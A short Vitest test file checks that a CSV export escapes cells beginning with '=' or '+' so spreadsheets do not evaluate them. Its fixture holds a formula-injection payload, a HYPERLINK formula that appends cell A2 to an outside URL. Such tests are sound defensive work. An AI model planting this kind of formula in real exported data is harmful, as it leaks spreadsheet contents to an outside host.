import { describe, it, expect } from 'vitest'
import { toCsv } from './runsExport'

describe('runs CSV export', () => {
	it('quotes values a spreadsheet would evaluate as a formula', () => {
		const csv = toCsv([
			{ labels: '=HYPERLINK("https://x/?"&A2,"x")', tag: '+1', path: 'f/foo/-bar', n: -3 }
		])
		const [, row] = csv.split('\n')
		expect(row).toBe(`"'=HYPERLINK(""https://x/?""&A2,""x"")","'+1","f/foo/-bar",-3`)
	})
})
